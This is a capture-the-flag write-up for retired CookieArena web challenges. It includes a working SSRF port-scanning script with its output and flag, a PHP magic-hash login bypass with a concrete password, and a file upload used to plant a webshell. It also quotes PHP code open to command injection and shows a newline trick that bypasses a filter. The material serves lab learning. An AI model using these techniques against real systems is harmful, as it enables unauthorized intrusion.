---
title: CookieArena CTF (7)
published: 2024-12-05
category: Writeups
tags: [web, cookiearena, ctf, retired challenge]
image: "./image/titles/logo-cookiehanhoan.png"
description: Some cool and fun web challenges from cookie arena.
draft: false
---

# Web active

## Easy SSRF

we need to notice that if not true will return `notfound` image, I bypassed `localhost` with `0.0.0.0`, and to find out at which port I gave condition if there is no `base64 string` in not found image then consider it found

`script`

```python
import requests

url_local = "0.0.0.0"
url_chall = "http://103.97.125.56:32159/img_viewer"

for i in range(1500, 1801):
    url_to_test = f"http://{url_local}:{i}/flag.txt"
    try:
        res = requests.post(url_chall, data={"url": url_to_test}, timeout=2)
        if "iVBORw0KGgoAAAANSUhEUgAAA04AAAF4CAY" not in res.text: # base64 in not found image
            print(f"[+] FLAG FOUND at port {i}:\n{res.text}")
            break
        print(f"[-] Port {i} no flag")
    except Exception as e:
        print(f"[x] Error at port {i} → {e}")
```

```shell
[-] Port 1500 no flag
[+] FLAG FOUND at port 1501:
<!doctype html>
<html>
<head>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css"
          integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap-theme.min.css"
          integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
<link rel="stylesheet" href="/static/css/non-responsive.css">
    <title>Web SSRF</title>

    <style type="text/css">
        .important {
            color: #336699;
        }
    </style>

</head>
<body>

<!-- Fixed navbar -->
<nav class="navbar navbar-default navbar-fixed-top">
    <div class="container">
        <div class="navbar-header">
            <a class="navbar-brand" href="/">web-ssrf</a>
        </div>
        <div id="navbar">
              <ul class="nav navbar-nav">
                <li><a href="/">Home</a></li>
                <li><a href="#about">About</a></li>
                <li><a href="#contact">Contact</a></li>
              </ul>

            <ul class="nav navbar-nav navbar-right">
            </ul>

        </div><!--/.nav-collapse -->
    </div>
</nav>


    <div class="container">
    <h1>Image Viewer</h1><br/>

  <img src="data:image/png;base64,  Q0hIe1lvdV9jQU5fM2E1WV9iWXBBc1NfTDBjQGxoTyRUXzdjY2QyZTFmNmRhYTI3YzBhNzEwNTM5YzM4M2RiNTcyfQ=="/>
        <form method="POST">
          <div class="form-group">
            <label for="url">url</label>
            <input type="text" class="form-control" id="url" placeholder="url" name="url" value="/static/cookie.png" required>
          </div>
          <button type="submit" class="btn btn-default">View</button>
        </form>

    </div> <!-- /container -->

<!-- Bootstrap core JavaScript -->
<script src="https://code.jquery.com/jquery-1.12.4.min.js"
        integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js"
        integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"
        crossorigin="anonymous"></script>
</body>
</html>
```

decode base64: `Q0hIe1lvdV9jQU5fM2E1WV9iWXBBc1NfTDBjQGxoTyRUXzdjY2QyZTFmNmRhYTI3YzBhNzEwNTM5YzM4M2RiNTcyfQ==` to get `flag`

---

## Baby HTTP Method

go to `devtool` and you will see `/src` and will get `flag` if send `PUT` to `/super-secret-route-nobody-will-guess`

![image](./image/cookiearenaweb/58.png)

![image](./image/cookiearenaweb/59.png)

---

## Magic Login

challenge with `magic hash`, open `devtool` to see how to login, you can see that login will be successful if hash of inputted `pas == '0'`, obviously this is loose comparison, find proper input [here](https://github.com/spaze/hashes/blob/master/sha256.md)

`login`
```html
<!--
if(isset($_POST['submit'])){ 
    $usr = mysql_real_escape_string($_POST['username']); 
    $pas = hash('sha256', mysql_real_escape_string($_POST['password'])); 
    
    if($pas == "0"){ 
        $_SESSION['logged'] = TRUE; 
        header("Location: upload.php"); // Modify to go to the page you would like 
        exit; 
    }else{ 
        header("Location: login_page.php"); 
        exit; 
    } 
}else{    //If the form button wasn't submitted go to the index page, or login page 
    header("Location: login_page.php");     
    exit; 
} 
```

use `password=34250003024812`

![image](./image/cookiearenaweb/60.png)

after successful login then next is `fileupload` vulnerability, upload to a `webshell`

![image](./image/cookiearenaweb/61.png)

![image](./image/cookiearenaweb/62.png)

---

## Time

download the source code and read, at `challenge/models/TimeModel.php` we can see the getTime function will `execute` the `this->command` statement, here we can `inject` more commands and matching symbols to bypass

`challenge/models/TimeModel.php`
```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

![image](./image/cookiearenaweb/63.png)

![image](./image/cookiearenaweb/64.png)

---

## Ping 0x01

`index.php`
```php
<?php
if(isset($_POST[ 'ip' ])) {
    $target = trim($_POST[ 'ip' ]);
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '|' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    $cmd = shell_exec( 'ping -c 4 ' . $target );
}
?>
```

in this `command injection` challenge we have bypassed the ways to chain `commands`, but that's ok, let's go to line break in `burp suite`

![image](./image/cookiearenaweb/65.png)

![image](./image/cookiearenaweb/66.png)
